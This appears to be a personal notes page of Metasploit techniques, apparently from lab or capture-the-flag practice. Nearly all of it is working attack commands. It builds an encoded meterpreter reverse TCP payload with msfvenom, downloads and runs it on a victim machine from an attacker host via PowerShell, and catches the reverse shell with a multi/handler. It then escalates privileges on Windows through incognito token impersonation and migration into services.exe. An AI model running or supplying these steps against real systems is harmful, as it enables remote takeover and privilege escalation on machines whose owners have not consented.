Metasploit can be used in countless ways.  These are just a few things I found interesting and helpful along the way.

## Upgrade Powershell to Metrepreter

If you are able to land a standard powershell connection from the victim machine, you can upgrade the shell to a meterpreter shell.

This payload generates an encoded x86-64 reverse TCP meterpreter payload.
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.57.139 LPORT=1224 -f exe -o upgradeShell.exe
```

After creating this payload, download it to the machine using the same method in the previous step:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.57.139:80/upgradeShell.exe','upgradeShell.exe')"
```
Before running this program, ensure the handler is set up in Metasploit:

```bash
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.6.57.139 set LPORT 1224 run
```
Once this is running, enter this command to start the reverse shell

```powershell
Start-Process "upgradeShell.exe"
```

## Windows Escalation Technique

### SeDebugPrivilege / SeImpersonatePrivilege

If these two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled, wec can use the incognito module in metasploit to exploit this vulnerability.

```bash
use incognito 
```
**You may need to use the `load incognito` command if the previous command doesn't work.**

Check which tokens are available:
```bash
list_tokens -g
```
Use this command to impersonate the Administrator's token if it is available:
```bash
impersonate_token "BUILTIN\Administrators"
```
Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do)

The safest process to pick is the services.exe process. First, use the `ps` command to view processes and find the `PID` of the services.exe process. 

Migrate to this process using the command
```bash
migrate PID-OF-PROCESS
```
